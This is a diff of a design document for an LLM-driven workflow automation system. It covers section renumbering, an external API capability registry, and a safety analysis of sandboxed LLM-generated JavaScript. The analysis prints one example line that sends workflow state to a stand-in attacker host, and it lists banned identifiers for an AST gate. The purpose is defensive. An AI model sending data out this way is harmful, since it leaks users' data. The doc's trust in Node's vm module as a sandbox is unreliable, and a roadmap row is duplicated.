@@ -16,7 +16,7 @@ A self-evolving, low-cost cognitive automation brain that:
 - Uses LLM sparingly — only for novel intents, workflow generation, and schema creation
 - Persists generated workflows in PostgreSQL and reuses them — LLM is not called twice for the same problem
 - Evolves its own workflows and schemas over time
-- Runs at approximately $8–$13/month at household scale — see Section 14 for full cost breakdown
+- Runs at approximately $8–$13/month at household scale — see Section 16 for full cost breakdown
 
 ---
 
@@ -287,7 +287,6 @@ evolving-mind-ai/
   is imported in `ProcFunction`. Isolated here so endpoint modules stay AWS-agnostic.
 - `llm-client.mjs` — `callLlm()`, `callLlmWithCorrection()` — shared LLM caller
 - `serv-client.mjs` — `servPost()`, `getRows()`, `insertRow()`, `updateRows()` — shared SERV HTTP client
-```
 
 ### 3.5a Inter-module call rules — FINAL
 
@@ -335,7 +334,7 @@ path and the SlackCallbackListenerFunction will receive `provider: undefined`.
 4. Document in `openapi.yaml` spec-first
 5. Never import AWS SDK in the endpoint module
 6. Read callback as `req.callback ?? req.body?.callback ?? null` — never `req.body.callback`
-
+```
 
 ### 3.6 Transport-agnostic endpoint pattern — IMPORTANT
 
@@ -1362,13 +1361,12 @@ Called by the iterator at step 5 — one invocation per table.
 ```
 
 The `field_editor` option type renders a Slack Block Kit message with:
-```
 - Each field shown as a row: name, type, nullable indicator
 - [✏️ Modify] button per field → opens modal with type/nullable/default inputs
 - [❌ Remove] button per field (protected: `id`, `created_at`, `updated_at` cannot be removed)
 - [➕ Add field] button → opens modal with name/type inputs
 - [✅ Done] button → confirms and pops the sub-workflow frame
-```
+
 #### Local state shape during execution
 
 ```json
@@ -1674,11 +1672,30 @@ before any `createTable` call fires.
 Used for `js_transform` steps where the LLM generates executable JavaScript.
 There is no JSON Schema equivalent for arbitrary JS — two complementary gates are used instead.
 
+**Scope constraint — synchronous transforms only:**
+`js_transform` is restricted to pure synchronous data transformation — reshaping state,
+extracting fields, merging objects, computing derived values. No async operations,
+no I/O, no external API calls. The AST gate (Gate 1) enforces this by rejecting any
+function containing `async`, `await`, `fetch`, `require`, or `import`.
+
+External data enrichment from third-party APIs (e.g. Finnhub stock prices) is handled
+by the `capability_call` step type — see Section 15 for the API Registry design.
+This separation is intentional: arbitrary fetch in LLM-generated code is an
+exfiltration vector that the capability registry eliminates by design.
+
+**Why vm.runInNewContext timeout is sufficient for sync-only:**
+Node.js `vm.runInNewContext({ timeout: N })` reliably kills synchronous infinite loops
+because Node.js is single-threaded — the event loop cannot yield to the timed-out
+context. This timeout does NOT apply to async operations, which is precisely why
+async code is prohibited in js_transform and enforced at the AST gate before execution.
+
 **Gate 1 — Static AST parse (acorn)**
 
-Parse the generated JS using `acorn` before executing it. If the source is syntactically
-invalid, it cannot be executed safely. Reject immediately, log, apply correction loop.
-This is the security gate referenced in Section 6.5 — already planned for `js_transform`.
+Parse the generated JS using `acorn` before executing it. Reject if:
+- Syntactically invalid
+- Contains async/await keywords
+- Contains fetch, require, or import expressions
+- Contains network or file system identifiers
 
 **Gate 2 — In-situ sandbox execution**
 
@@ -1690,7 +1707,7 @@ correction loop.
 ```js
 import vm from 'node:vm';
 
-const sandbox = vm.createContext({ input: testInput });
+const sandbox = { input: testInput };
 const result  = vm.runInNewContext(generatedCode, sandbox, { timeout: 500 });
 // validate result shape against PGC_StepType.output_schema
 ```
@@ -1959,7 +1976,8 @@ Steps R6–R7 are highest risk: two Lambdas competing for WorkflowQueue. Move th
 | 1 | SERV-Query — cross-entity parameterised SELECT with pagination |
 | 2 | Parallel execution — fan-out/fan-in, optimistic locking |
 | 3 | Unit + integration tests — node:test, testcontainers |
-| 4 | CI/CD GitHub Actions — after template.yaml stabilises |
+| 4 | Unit + integration tests — node:test, testcontainers |
+| 5 | CI/CD GitHub Actions — after template.yaml stabilises |
 
 ## 10. pgvector — Semantic Search
 
@@ -2115,11 +2133,203 @@ All Phase 1 refactoring is complete as of `v3.2-clean-baseline`.
 | `POST /proc/run-workflow` | ⬜ Phase 2 item 5 — Step Processor |
 | `POST /proc/improve-prompt` | ⬜ Phase 3 — prompt evolution |
 
+
 ---
 
-## 14. Cost of Ownership
+## 15. Tangential Features
 
-### 14.1 Actual March 2026 Charges (us-east-2, household-scale dev)
+Features discussed and designed but deferred — either because they require the Step
+Processor to exist first, or because they represent a meaningful expansion of scope
+that warrants explicit architectural review before implementation.
+
+---
+
+### 15.1 External API Registry — capability_call Step Type
+
+#### The problem
+
+The `js_transform` step type is restricted to pure synchronous data transformations.
+External data enrichment from third-party APIs — fetching stock prices from Finnhub,
+weather data, exchange rates — cannot be done safely in LLM-generated JS because:
+
+- `vm.runInNewContext` timeout does not apply to async operations
+- LLM-generated fetch calls are an exfiltration vector — a prompt injection attack
+  or hallucinated URL could send workflow state to an attacker's endpoint
+- API keys embedded in generated code are exposed in PGC_Workflow rows
+- No rate limiting, retry logic, or circuit breaking on arbitrary fetch
+
+Hardcoded service wrappers (e.g. `src/shared/finnhub-client.mjs`) solve the safety
+problem but don't evolve — every new data source requires a new file and a deployment.
+
+#### The design
+
+The system maintains a **capability registry** of approved external integrations.
+Each registered capability defines what can be called, how to authenticate, and
+what parameters are allowed. The LLM generates workflow steps that reference
+capability keys — it never constructs URLs, never sees API keys, and cannot call
+anything outside the registry.
+
+**PGC_Capability schema extension** (Phase 3 — current table tracks internal
+capabilities only; these columns are added when the API Registry is built):
+
+| Column | Type | Notes |
+|---|---|---|
+| base_url | text | Root URL for the API — e.g. https://finnhub.io/api/v1 |
+| endpoints | jsonb | Named endpoint templates — e.g. { "quote": "/quote?symbol={{symbol}}" } |
+| auth | jsonb | Auth config — { type: "query_param", key: "token", ssm_path: "/evolving-mind-ai/finnhub-api-key" } |
+| allowed_params | jsonb | Whitelist of parameter names the LLM may supply — e.g. ["symbol", "resolution", "from", "to"] |
+| rate_limit | text | Human-readable limit — e.g. "60/minute". Step Processor enforces via token bucket |
+| timeout_ms | integer | Per-call timeout. Default 5000ms |
+
+Auth credentials are stored in SSM, never in the database. The Step Processor
+resolves the SSM path at execution time — the LLM never sees the value.
+
+**New step type: capability_call**
+
+The LLM generates a workflow step referencing a registered capability:
+
+```json
+{
+  "step": 3,
+  "type": "capability_call",
+  "capability_key": "finnhub_quote",
+  "endpoint": "quote",
+  "params": { "symbol": "{{state.ticker}}" },
+  "output_key": "current_price",
+  "on_success": "next",
+  "on_failure": "human_feedback"
+}
+```
+
+The Step Processor resolves the capability definition, fetches the SSM key, constructs
+the URL from the template substituting only whitelisted params, makes the fetch call
+with timeout, and maps the response to output_key in workflow state.
+
+**What the LLM controls:** which registered capability to call, which endpoint,
+which whitelisted params with values from workflow state.
+
+**What the LLM cannot control:** the base URL, auth credentials, non-whitelisted
+params, or any URL not defined in the capability registry.
+
+#### Finnhub integration — first capability
+
+Finnhub provides stock quotes, historical price candles, and company profiles.
+Seed row for PGC_Capability when the API Registry is built:
+
+```json
+{
+  "capability_key": "finnhub",
+  "category": "external_api",
+  "description": "Finnhub stock market data — quotes, candles, company profiles",
+  "status": "planned",
+  "base_url": "https://finnhub.io/api/v1",
+  "endpoints": {
+    "quote":        "/quote?symbol={{symbol}}",
+    "candles":      "/stock/candle?symbol={{symbol}}&resolution={{resolution}}&from={{from}}&to={{to}}",
+    "company_info": "/stock/profile2?symbol={{symbol}}"
+  },
+  "auth": {
+    "type": "query_param",
+    "key": "token",
+    "ssm_path": "/evolving-mind-ai/finnhub-api-key"
+  },
+  "allowed_params": ["symbol", "resolution", "from", "to"],
+  "rate_limit": "60/minute",
+  "timeout_ms": 5000
+}
+```
+
+#### Example workflow — update stock portfolio prices
+
+Once the Step Processor and capability_call are built, the LLM can generate a
+workflow like "update current prices for all holdings" without any bespoke code:
+
+```
+Step 1 — serv_entity: listEntities(Holding) → state.holdings
+Step 2 — js_transform: extract unique tickers from holdings → state.tickers
+Step 3 — iterator over state.tickers (sequential):
+  Step 3a — capability_call: finnhub/quote(symbol=ticker) → state.quote
+  Step 3b — serv_entity: upsertEntity(StockPrice, { ticker, price, recorded_at: now })
+Step 4 — notify: "Updated prices for N holdings"
+```
+
+Step 2 is a pure synchronous transform — safe for js_transform. Step 3a uses the
+capability registry — controlled, auditable, rate-limited. No bespoke code. The
+LLM generates this workflow definition the first time the user asks for it, stores
+it in PGC_Workflow, and it runs from cache on every subsequent invocation.
+
+#### Why this is in the spirit of an evolving mind
+
+The brain doesn't grow by being able to call anything — it grows by learning which
+registered capabilities solve which problems. When Finnhub is added to the registry,
+the LLM can immediately propose workflows that use it. When IEX Cloud or a weather
+API is added later, the same pattern applies with zero code changes. The LLM
+discovers and composes capabilities; it doesn't implement them.
+
+#### What needs to be built (Phase 3)
+
+1. PGC_Capability schema extension — add the API Registry columns listed above
+2. SSM parameter for Finnhub API key — /evolving-mind-ai/finnhub-api-key
+3. New capability_call row in PGC_StepType seed data
+4. Step Processor handler for capability_call — URL construction, SSM key resolution,
+   fetch with timeout, response mapping to output_key
+5. Finnhub seed row in PGC_Capability
+6. Rate limiting — token bucket in PGC_WorkflowRun state or a dedicated table
+
+---
+
+### 15.2 js_transform Safety Analysis — Synchronous Constraint
+
+This section captures the design analysis behind the js_transform synchronous-only
+constraint documented in Section 6.10, for future reference if the constraint is
+ever revisited.
+
+#### The timeout problem
+
+`vm.runInNewContext({ timeout: N })` in Node.js reliably kills synchronous infinite
+loops. It does NOT apply to async operations. A function that does
+`await fetch('https://attacker.com?data=' + JSON.stringify(state))` returns a Promise
+immediately — the sandbox "completes" in microseconds and the async exfiltration
+continues outside any timeout control.
+
+This is not a Node.js bug — it is by design. The single-threaded event loop means
+there is no thread to interrupt for async work.
+
+#### Options considered
+
+**Worker threads with terminate()** — `worker_thread` can be hard-killed regardless
+of async state. Adds cold start overhead (~50–100ms), requires serialisation of
+input/output across the thread boundary, and the security boundary is weaker than
+vm since workers share the same V8 heap process.
+
+**Dedicated sandbox Lambda** — invoke a separate Lambda with its own hard timeout
+for JS execution. AWS enforces Lambda timeouts at the infrastructure level regardless
+of async operations. Clean security boundary, true async timeout. Adds ~100ms
+cold start latency and per-invocation Lambda cost. Viable for Phase 3+ if
+js_transform needs I/O.
+
+**Prohibit async in js_transform, use capability_call for I/O** — chosen approach.
+The AST gate rejects any function containing async/await/fetch before execution.
+Pure synchronous transforms remain in js_transform. All I/O goes through the
+controlled capability registry. Clean separation, zero new infrastructure.
+
+#### Why the chosen approach is correct for this system
+
+The purpose of js_transform is data reshaping between steps — extracting fields,
+computing derived values, merging objects. This work is inherently synchronous.
+The desire for external API calls in a workflow step is not a js_transform concern —
+it is a capability_call concern. The distinction between "transform data I already
+have" and "fetch data I don't have" is architecturally meaningful and worth enforcing.
+
+If a use case genuinely requires LLM-generated code that makes async I/O calls,
+the correct path is the dedicated sandbox Lambda (Option B above), not relaxing
+the js_transform constraint.
+
+---
+
+## 16. Cost of Ownership
+
+### 16.1 Actual March 2026 Charges (us-east-2, household-scale dev)
 
 Based on actual AWS billing data for March 2026 with the current infrastructure:
 
@@ -2141,7 +2351,7 @@ Based on actual AWS billing data for March 2026 with the current infrastructure:
 The dominant costs are the always-on infrastructure: RDS instance, Bastion host, and
 the AWS public IPv4 charge introduced in 2024 ($0.005/hr per address).
 
-### 14.2 Cost Breakdown by Component
+### 16.2 Cost Breakdown by Component
 
 | Component | Monthly Cost | Scales With |
 |---|---|---|
@@ -2155,7 +2365,7 @@ the AWS public IPv4 charge introduced in 2024 ($0.005/hr per address).
 | SSM Parameters | $0.16 | Number of SecureString parameters |
 | **Total infrastructure** | **~$10.38** | |
 
-### 14.3 Database Size Scenarios
+### 16.3 Database Size Scenarios
 
 evolving-mind-ai stores **structured relational data only** — rows of text, numbers,
 dates, and jsonb. It does not store files, images, documents, or binary content.
@@ -2180,7 +2390,7 @@ Those belong in S3 — $0.023/GB/month, effectively unlimited. If evolving-mind-
 ever needs to reference media files, the pattern is to store the S3 key in a
 text column, not the file itself.
 
-### 14.4 LLM Cost Estimates (Perplexity)
+### 16.4 LLM Cost Estimates (Perplexity)
 
 LLM is called **only for novel intents** — once per new domain design, once per
 new workflow generation. Repeat operations use cached `PGC_Workflow` rows and cost $0.
@@ -2198,7 +2408,7 @@ LLM cost is negligible at household scale. The design decision to cache workflow
 in `PGC_Workflow` and reuse them means the LLM bill does not grow with usage —
 only with novelty.
 
-### 14.5 Total Cost of Ownership Summary
+### 16.5 Total Cost of Ownership Summary
 
 | Scenario | AWS Infrastructure | LLM | Total/Month |
 |---|---|---|---|
@@ -2210,7 +2420,7 @@ Storage cost is nearly flat across all scenarios because structured relational d
 is compact. The dominant cost driver at every scale is the always-on RDS instance
 and Bastion host — not data volume.
 
-### 14.6 Cost Reduction Opportunities
+### 16.6 Cost Reduction Opportunities
 
 | Action | Monthly Saving | When to Apply |
 |---|---|---|
